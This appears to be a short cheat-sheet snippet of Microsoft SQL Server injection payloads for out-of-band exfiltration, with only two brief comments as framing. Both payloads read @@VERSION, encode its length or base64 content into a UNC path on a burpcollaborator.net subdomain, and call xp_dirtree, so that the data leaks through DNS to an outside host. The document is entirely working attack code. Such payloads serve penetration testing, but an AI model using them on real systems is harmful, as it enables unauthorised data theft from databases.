/* get length of command's result */
declare @a nvarchar(max), @b nvarchar(100);set @a = (select @@VERSION); set @b = concat('\\', len(@a), '.604k9w9usevobc5n1sw5jr3u2l8jw8.burpcollaborator.net\xda'); exec master.dbo.xp_dirtree @b;

/* OOB */
declare @a nvarchar(max), @b nvarchar(100), @source VARBINARY(MAX);
set @a = (select @@VERSION);
set @source = CONVERT(VARBINARY(MAX), @a);
set @b = SUBSTRING(CAST('' AS XML).value('xs:base64Binary(sql:variable("@source"))', 'varchar(max)'), 0, 20)
set @b = concat('\\\\', len(@a), '.', @b, '.n5t1edebxv05gta4691mo88b72dy1n.burpcollaborator.net\\');
exec master.dbo.xp_dirtree @b;